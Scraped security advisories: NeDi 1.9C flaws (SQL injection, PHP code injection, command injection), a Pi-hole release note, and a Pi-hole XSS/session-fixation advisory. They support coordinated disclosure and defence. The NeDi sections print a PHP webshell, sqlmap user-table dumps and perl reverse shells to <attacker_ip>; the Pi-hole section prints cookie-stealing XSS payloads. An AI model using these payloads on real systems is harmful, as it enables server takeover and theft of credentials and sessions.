* Feb 10, 2021
* 9 minutes read

[![]()](https://n4nj0.github.io/advisories/nedi-multiple-vulnerabilities-i/ "NeDi 1.9C - Multiple Vulnerabilities")
## TL;DR

I have found three security issues on NeDi 1.9C:

**1 - SQL Injection**: An authenticated user is able to perform a SQL Injection in the Monitoring History function on the endpoint /Monitoring-History.php via the det HTTP GET parameter.

**2 - Code Injection**: An authenticated user is able to inject PHP code in the System Files function on the endpoint /System-Files.php via the txt HTTP POST parameter.

**3 - Command Injection**: An authenticated user is able to execute operating system commands in the Nodes Traffic function on the endpoint /Nodes-Traffic.php via the md or ag HTTP GET parameter.

## Product Information

* **Product Name:** NeDi
* **Affected Version:** 1.9C
* **Tested platforms:**
  + Manual installation with the automated NeDi install [nebuntu.sh](https://www.nedi.ch/pub/nebuntu.sh)
  + Debian 10 appliance for quick deployment [NeDian20 OVA](https://www.nedi.ch/pub/NeDian20.ova)
* **Organization Name:** NeDi Consulting
* **Product Web Page:** <https://www.nedi.ch>
* **Email:** [info@nedi.ch](info%40nedi.ch)
* **Vulnerability Disclosure Info Web Page:** <https://www.nedi.ch/impressum>

NeDi is an open source software tool which discovers, maps and inventories network devices and tracks connected end-nodes.

During a security auditing of the product, I have found three issues.

The first is a SQL Injection, the second is a Code Injection, and the third is a Command Injection.

The fixes were developed by the owner three day after my vulnerability notification. That’s a very professional way to handle high impact security vulnerabilities!

It is recommended to apply the latest patch 1.9Cp1: <https://www.nedi.ch/pub/nedi-1.9C1.ptc>

## Vulnerability Details

### **1 - Improper Neutralization of Special Elements used in an SQL Command (‘SQL Injection’) - CWE-89**

* **Summary:** An authenticated user can perform a SQL injection attack to access all the data in the database and obtain access to the web application.
* **Prerequisites:** Valid credentials for NeDi web interface. Also, some events have to be present on the Monitoring History graphs.
* **CVE and CVSS Score:** [CVE-2021-26751](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-26751) | [**8.8** (High)](https://nvd.nist.gov/vuln/detail/CVE-2021-26751)

**Step-by-step instructions and PoC**

First, it is necessary to perform a network discovery to generate events. Those events populate the Monitoring History graphs.

An authenticated user that visits the Monitoring History page can perform a SQL injection attack in the **det** parameter.

**Affected Endpoints**

* **URL:** <https://hostname/Monitoring-History.php>
* **HTTP Parameter:** det

Below are the evidences with the vulnerability details and the payloads used.

The starting point is a standard installation of NeDi version 1.9C (the latest), via the deployment of the [NeDian20 OVA](https://www.nedi.ch/pub/NeDian20.ova) or with the installation script [nebuntu.sh](https://www.nedi.ch/pub/nebuntu.sh), without further configuration. After the installation, it is necessary to perform a network discovery to generate events for the vulnerability PoC.

Login to NeDi web administrative interface with the **admin** account.

To execute a network discovery to generate events, go to **System** -> **NeDi**, or directly to the URL <https://hostname/System-NeDi.php>.

Select **Discover** -> **Ping** -> **Source** -> **<IP\_ADDRESS>** -> **Execute** and wait 1 minute.

![Network discovery](/images/7203c990163ed0b6b0dc3d24135eb4f1.png)

To view the results, go to **Monitoring** -> **History** -> **Show**, or directly to the URL <https://hostname/Monitoring-History.php>.

Select a big time frame, like **30 Hours**. The important is to have data in the graph.

When it is seen the green event peak, intercept the request with a proxy like [**Burp Suite**](https://portswigger.net/burp).

![Monitoring History](/images/9fd0c32a849940b9141eb847e0ded96b.png)

The request on Burp Suite will be like the next screenshot.

![Burp Suite - SQLi](/images/fc67a35a443fca84798d4ec2bf65fa9b.png)

Copy the intercepted request, and paste the content a text file named **monitoring.txt**, similar to the following one:

```
GET https://hostname/Monitoring-History.php?in%5B%5D=info&op%5B%5D=%7E&st%5B%5D=&det=class&gra=3600&fmt=ag&stt=01%2F27%2F2021+18%3A15&dur=1800&sho=Show HTTP/1.1

Cookie: PHPSESSID=hlkgaah276693mqb0ce09qk1hh
Upgrade-Insecure-Requests: 1

```

Then, use the [**SQLMap**](http://sqlmap.org) tool to exploit the vulnerability with the following command:

```
sqlmap -r monitoring.txt --level=5 --risk=3 --random-agent --dbms=mysql --banner

```

The banner of the database is gathered as PoC of the vulnerability:

![SQLMap - Banner](/images/51462c09402afab2d2043b849910d2e9.png)

It is possible to dump all the NeDi database to extract the credentials. If a successful password cracking attack is accomplished, an attacker can use the credentials to login to the NeDi admin page.

To extract the **users** table, use the following command:

```
sqlmap -r monitoring.txt --level=5 --risk=3 --random-agent --dbms=mysql -D nedi -T users --dump

```

![SQLMap - Database dump](/images/ecb294d282eb9ee7179679a22e661a42.png)

The vulnerability is tested on NeDi version 1.9C, as depicted by the following screenshot:

![Vulnerable version confirmation - NeDi 1.9C](/images/ed71dd9f2087c7f98eb4770ed8f72ee7.png)

**Security Impact**

By exploiting this issue an attacker is able to access all the data in the database and obtain access to the NeDi application, because all the data, including NeDi credentials, can be extracted and cracked.

It is important to note that a valid NeDi administator account is also able to execute Remote Code Execution attack because of the following reported issues that allows Remote Code Execution. This scenario allows the entire compromise of the target operating system where NeDi is installed.

### **2 - Improper Control of Generation of Code (Code Injection) - CWE-94**

* **Summary:** An authenticated user is able to inject PHP code to obtain access to the operating system where NeDi is installed and to all application data.
* **Prerequisites:** Valid credentials for NeDi web interface.
* **CVE and CVSS Score:** [CVE-2021-26753](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-26753) | [**9.9** (Critical)](https://nvd.nist.gov/vuln/detail/CVE-2021-26753)

**Step-by-step instructions and PoC**

An authenticated user that visits the System Files page can perform a Code Injection attack in the **txt** parameter.

**Affected Endpoints**

* **URL:** <https://hostname/System-Files.php>
* **HTTP Parameter:** txt

Below are the evidences with the vulnerability details and the payloads used.

The starting point is a standard installation of NeDi version 1.9C (the latest), via the deployment of the [NeDian20 OVA](https://www.nedi.ch/pub/NeDian20.ova) or with the installation script [nebuntu.sh](https://www.nedi.ch/pub/nebuntu.sh), without further configuration. After the installation, it is necessary to edit a PHP file on the web interface and bypass the execution filter.

Login to NeDi web administrative interface with the **admin** account.

To edit a PHP file, go to **System** -> **Files**, or directly to the URL <https://hostname/System-Files.php>.

Select **log/devtools**, that will be opened with the text editor.

Add the following line at the beginning of the file:

```
<?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; }?>

```

The reason to add it to on the top, is to bypass the direct execution prevention code:

```
# Quit if called directly
if( !isset($_SESSION['group']) ) exit;

```

The code will prevent to execute the webshell, if the following page is requested directly:
<https://hostname/log/devtools.php>

It il possible to leave the remaining code, because the rest of if will not be executed.

![System Files - Code Injection - Payload](/images/95ab5a4240d1f11b191582c4947ad2f4.png)

After selecting **Write**, the file will be saved to disk.

![System Files - Code Injection - Save PHP page](/images/67194cdf39f5db7e4f8e53c66848aad2.png)

Open a handler on another machine:

```
nc -nlvp 4444

```

Then, choose a perl reverse shell, for example:

```
perl -e 'use Socket;$i="<attacker_ip>";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

```

To execute the reverse shell on the URL, do not forget to encode the space character to **+** and & character to **%26**, than execute the payload in a browser with a valid session, replacing the string `<attacker_ip>` with the valid IP address:

```
https://hostname/log/devtools.php?cmd=perl+-e+'use+Socket;$i="<attacker_ip>";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">%26S");open(STDOUT,">%26S");open(STDERR,">%26S");exec("/bin/sh+-i");};'

```

The code is executed and a reverse shell is obtained.

![Code Injection - Reverse shell](/images/f2d4025ba79af3bde1e64e521580c0e4.png)

It is important to note that a web application should not allow the server-side language file edit, in particular in scenarios where there must be segregation of duties between application administrators and operating system ones.

The HTTP request of the vulnerable parameter is the following, which does not sanitize the user input on **txt** parameter:

![Code Injection - vulnerable parameter](/images/f230fb58d7146aa0a35d7a283dde9e72.png)

The vulnerability is tested on NeDi version 1.9C, as depicted by the following screenshot:

![Vulnerable version confirmation - NeDi 1.9C](/images/ed71dd9f2087c7f98eb4770ed8f72ee7.png)

**Security Impact**

When software allows a user’s input to contain code syntax, it might be possible for an attacker to craft the code in such a way that it will alter the intended control flow of the software. Such an alteration could lead to arbitrary code execution.

On its own, an arbitrary code execution exploit will give the attacker the same privileges as the target process that is vulnerable. This includes access to all the data of the target application and the underlying operating system.

### **3 - Improper Neutralization of Special Elements used in an OS Command (‘OS Command Injection’) - CWE-78**

* **Summary:** An authenticated user is able to execute operating system commands to obtain access to the operating system where NeDi is installed and to all application data.
* **Prerequisites:** Valid credentials for NeDi web interface.
* **CVE and CVSS Score:** [CVE-2021-26752](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-26752) | [**8.8** (High)](https://nvd.nist.gov/vuln/detail/CVE-2021-26752)

**Step-by-step instructions and PoC**

This security issue is found through source code analysis. By using special values in the **Nodes-Traffic.php** endpoint, it is found that the URL parameters **md** and **ag** are not sanitized.

An authenticated user that requests a URL with two forged parameters is able to execute operating system commands.

**Affected Endpoints**

* **URL:** <https://hostname/Nodes-Traffic.php>
* **HTTP Parameters:** md, ag

Below are the evidences with the vulnerability details and the payloads used.

The starting point is a standard installation of NeDi version 1.9C (the latest), via the deployment of the [NeDian20 OVA](https://www.nedi.ch/pub/NeDian20.ova) or with the installation script [nebuntu.sh](https://www.nedi.ch/pub/nebuntu.sh), without any configuration.

The PHP code on file **/var/nedi/html/Nodes-Traffic.php** uses several `exec()` functions.

The one at line **517** can be triggered if the variable `$am` is true.

![Command Injection - Target exec function](/images/8a4932fc089064cae7911f0504d8ac29.png)

On the beginning of the code, it is clear that is possible to control the `$am` variable, on the purpose to enter the conditional branch of line 514.

The `$am` variable cannot be controlled directly, but the `$md` one can be.

According to the code, it is noted that:

* On line **23**, the `$md` is taken as URL parameter and is not being sanitized.
* On line **26**, if `$md = S`, the target variable will be `$am = 1`.

![Command Injection - $md and $am variable code](/images/4fd728859a97bb6f5f78717f69d46c62.png)

To exploit this code branch, first login to NeDi web administrative interface with the **admin** account.

As simple test, the following request can be triggered in the browser to write a simple file on `/tmp`:

```
https://hostname/Nodes-Traffic.php?md=S&ag=%3btouch+/tmp/pippo%3b

```

![Command Injection - Test command](/images/1278ebf47c921bf74f81719e373ec53e.png)

This is working because of the semicolon `;` inserted before and after the command.

Indeed, the final value for the variable `$nfcmd` will be:

```
nfdump -M /var/nfdump/ -r nfcapd.202101290100 -a -A srcip4/;touch /tmp/pippo; -O bytes -n 10 2>&1

```

That string is a valid Linux command, which gets executed by the `exec()` function on line **517**.

To take control of the operating system which runs the vulnerable application, first open a handler on another machine:

```
nc -nlvp 4444

```

To get the control of the server, use a perl reverse shell, replacing the string `<attacker_ip>` with the valid IP address:

```
https://hostname/Nodes-Traffic.php?md=S&ag=%3bperl+-e+'use+Socket;$i="<attacker_ip>";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">%26S");open(STDOUT,">%26S");open(STDERR,">%26S");exec("/bin/sh+-i");};'%3b

```

![Command Injection - Reverse shell](/images/b55f1e89c57e11d2f76a859ab2b67bbf.png)

The vulnerability is tested on NeDi version 1.9C, as depicted by the following screenshot:

![Vulnerable version confirmation - NeDi 1.9C](/images/ed71dd9f2087c7f98eb4770ed8f72ee7.png)

**Security Impact**

When software allows a user’s input to contain code syntax, it might be possible for an attacker to craft the code in such a way that it will alter the intended control flow of the software. Such an alteration could lead to arbitrary code execution.

On its own, an arbitrary command execution exploit will give the attacker the same privileges as the target application that is vulnerable. This includes access to all the data of the target application and the underlying operating system.

# Pi-hole FTL v5.7 and Web v5.4 released

## Pi-hole FTL v5.7 and Web v5.4 released

Today, we release Pi-hole FTL v5.7 and Web v5.4. This release improves the security and reliability of your Pi-hole. The most important enhancements are summarized below:

#### Fix security flaws on the web interface

Thanks to Veno Eivazian who pointed us to three security flaws in the web interface. They could have been used to run JavaScript code in the user browser and to “steal” the login session. The latter shouldn’t cause any headaches for you as one should never run a Pi-hole open to the web. However, a possible malicious client *inside your home network* could have exploited them.

We have mitigated the three raised security issues by regenerating session ID on successful login (to prevent session fixation), by restricting PHP sessions to be cookie-only, by restricting the session cookie to be kept secret from possible malicious JavaScript code, and by encoding a message after failed [cross-origin resource sharing (CORS)](https://en.wikipedia.org/wiki/Cross-origin_resource_sharing) checking.

#### Inbuilt enhanced Denial-of-Service (DoS) protection

A DoS attack is a type of cyber attack in which a malicious actor attempts to make a service inaccessible to its intended users by disrupting the normal function of the device. DoS attacks typically work by **overwhelming** (flooding) a target with requests until normal traffic can no longer be processed. For other users, it then results in a denial of service. When facing the Internet, services have to be hardened against malicious attacks such as [Denial-of-Service (DoS) attacks](https://en.wikipedia.org/wiki/Denial-of-service_attack). Defensive responses to denial-of-service attacks typically involve special DoS protection systems but can also involve routers ([Access control list (ACL)](https://en.wikipedia.org/wiki/Access_control_list "Access control list") capabilities) and firewall rules (rate-limiting).

However, inside your local home network, you typically don’t set up proper countermeasures. This is perfectly fine as they are typically not needed. Nevertheless, we see quite often that “the Internet was taken down” (DNS resolution went unavailable) when a rogue client starting to hammer a blocked domain thousands of time every second, or, when an (accidentally) created DNS loop exists, e.g., between the router and your Pi-hole.

It is an interesting question how this should be solved and the simplest approach seems to be firewalling them away. However, we thought that this is not the best way to handle this because

1. Users may already have configured a firewall and checking which firewall was used together with foreseeing any possible conflicts with existing rules is next to impossible.
2. Simply blocking them seems counter-intuitive as the clients requesting clients never see that something is wrong.

Hence, we decided to implement a customizable rate-limiting into FTL itself. It defaults to the rather conservative limit of allowing no more than **1000 queries in a 60 seconds window for each client**. Afterwards, any further queries are replied to with empty replies with the status set to `REFUSED`. Both the number of queries within the window as well as the window size can be configured by the user. It is important to note that rate-limiting is happening on a *per-client* basis. Other clients can continue to use FTL while rate-limited clients are short-circuited at the same time.

Rate-limiting can easily be disabled by setting `RATE_LIMIT=0/0` in `/etc/pihole/pihole-FTL.conf`. If I want, say, to set a rate limit of 1 query per hour, the option should look like `RATE_LIMIT=1/3600`.

1000 queries in 60 seconds still permits more than one million queries *per device* in 24 hours. Hence, we believe this is not really a breaking change but should still prevent your Pi-hole from being DoSed away.

#### Improve interoperability with `systemd-resolved`

We implemented a mitigation for a long-standing [bug in `systemd-resolved`](https://github.com/systemd/systemd/issues/11849) that can lead to up to 5 seconds of artificial DNS resolution delay on respective clients. With the new version of FTL, `systemd-resolved` accepts blocked queries without any artificial delay.

#### Improve shared memory robustness

Our FTL engine is a heavily multi-threaded application using both threads and forks to give you the best and fastest DNS service. To communicate between individual forks, it uses shared memory. If multiple independent processes work on the same shared memory at the same time this can easily lead to issues with memory being written to / resized in an undefined manner. This new version of FTL detects if already existing shared memory blocks are in use by other processes and refuses to start in this case. This ensures that inconsistent shared memory cannot occur.

#### Other fixes, tweaks, and improvements

Furthermore, we address a few minor glitches, e.g., with [percentages not exactly adding up to 100%](https://discourse.pi-hole.net/t/wrong-percent-calculation-in-pie-chart/44277) or incorrect warnings in Pi-hole’s log files.

# Pi-hole - Multiple Vulnerabilities

* Feb 18, 2021
* 4 minutes read

[![]()](https://n4nj0.github.io/advisories/pi-hole-multiple-vulnerabilities-i/ "Pi-hole - Multiple Vulnerabilities")
## TL;DR

**1 - Reflected Cross-site Scripting**: A remote user is able to inject arbitrary web script or HTML due to incorrect sanitization of Origin header and achieve a Reflected Cross-Site Scripting attack against other users and steal the session cookie.

**2 - Session Fixation**: Session fixation vulnerability allows remote attackers to hijack web sessions via the PHPSESSID parameter.

## Product Information

* **Product Name:** Pi-hole
* **Vulnerable Version:** 5.0, 5.1, 5.1.1
* **Organization Name:** Pi-hole, LLC
* **Product Web Page:** <https://pi-hole.net/>
* **Email:** [disclosure@pi-hole.net](disclosure%40pi-hole.net)
* **Vulnerability Disclosure Info Web Page:** <https://pi-hole.net/contact/>

Pi-hole is a Linux network-level advertisement and Internet tracker blocking application which acts as a DNS sinkhole and optionally a DHCP server, intended for use on a private network.

During a security auditing of the product, I have found two issues. The first is a Reflected XSS, the second is a Session Fixation. Those issues can be combined to steal a valid administrative session.

The fixes were implemented by the owners after my vulnerability notification.

It is recommended to apply the latest update Pi-hole FTL v5.7 and Web v5.4: <https://pi-hole.net/2021/02/16/pi-hole-ftl-v5-7-and-web-v5-4-released/>

## Vulnerability Details

### **1 - Reflected Cross-site Scripting - Improper Neutralization of Input During Web Page Generation (Cross-site Scripting) - CWE-79**

* **Summary:** A remote user is able to inject arbitrary web script or HTML due to incorrect sanitization of user-supplied data and achieve a Reflected Cross-Site Scripting attack against other users and steal the session cookie.
* **Prerequisites:** No special configuration is required to reproduce the issue.
* **CVE and CVSS Score:** [CVE-2020-35592](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-35592) | [**5.4** (Medium)](https://nvd.nist.gov/vuln/detail/CVE-2020-35592)

**Step-by-step instructions and PoC**

An attacker is able to craft an HTTP request and send it to a user, authenticated to Pi-hole, to inject arbitrary web script or HTML into the HTTP **Origin** header, which reflect the user input.

**Affected Endpoints**

* **URL:** <http://hostname/admin>
* **HTTP Parameter:** Origin header

Below are the evidences with the vulnerability details and the payloads used.

Payload used to exploit the vulnerability:

```
GET /admin/ HTTP/1.1
Host: hostname
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Origin: aaa<script>alert(document.cookie)</script>

```

The user is invited to click on a malicious page that have JavaScript code to execute the following HTTP request on the browser of the victim:

![XSS - 1](/images/2fd0bb523d7946e780a209ca11be71bf.png)

The XSS payload gets reflected to the screen.

![XSS - 2](/images/ab243615327c43a12270942a75db8cd1.png)

It is important to note that the **PHPSESSID** session cookie does not have the **HttpOnly** flag, when first assigned to the user:

![XSS - 3](/images/8f425467cc188b93240a89e81fcb0525.png)

**Security Impact**

By exploiting this issue an attacker is able to target an application user with several type of direct or indirect impacts such as, credentials stealing, integrity compromising and different type of phishing attacks. This type of reflected XSS does require user interaction.

### **2 - Session Fixation - CWE-384**

* **Summary:** Session fixation vulnerability allows remote attackers to hijack web sessions via the PHPSESSID parameter.
* **Prerequisites:** No special configuration is required to reproduce the issue.
* **CVE and CVSS Score:** [CVE-2020-35591](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-35591) | [**5.4** (Medium)](https://nvd.nist.gov/vuln/detail/CVE-2020-35591)

**Step-by-step instructions and PoC**

The application does not generate new session cookie after the user is logged in. A malicious user is able to create a new session cookie value and inject it to a victim. After the victim logs in, the injected cookie becomes valid, giving the attacker access to the user’s account through the active session.

**Affected Endpoints**

* **URL:** <http://hostname/admin/index.php?login>
* **HTTP Parameter:** PHPSESSID cookie

Below are the evidences with the vulnerability details and the payload used.

By leveraging the previously found XSS vulnerability, the malicious user can create a request to inject an arbitrary PHPSESSID value to the victim browser:

```
GET /admin/ HTTP/1.1
Host: hostname
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Origin: aaa<script>document.cookie = "PHPSESSID"+"="+escape("mosmbqsp3lh7pf1ar2djcjmk5v")</script>
Cookie: PHPSESSID=mosmbqsp3lh7pf1ar2djcjmk5v

```

![Session Fixation - 1](/images/bcccc0b7b7861c28e3371dc3a25ff77b.png)

The following is the response of the payload and the new cookie added to the browser cookie storage:

![Session Fixation - 2](/images/055224568ea3762d5b13c06d082a4475.png)

Then, when the user performs a login, the new PHPSESSID becomes valid. The attacker can add it to its browser to autenticate to the web application:

![Session Fixation - 3](/images/c42617cec0dd8eafd509108ec94230c9.png)

Indeed, after a user login, there is no a new generation of PHPSESSID:

![Session Fixation - 4](/images/a94a5c151aed793c9d78fab3032fe36e.png)

**Security Impact**

By exploiting this issue, an attacker is able to obtain a valid user session of the application. This type
of attack does require user interaction.
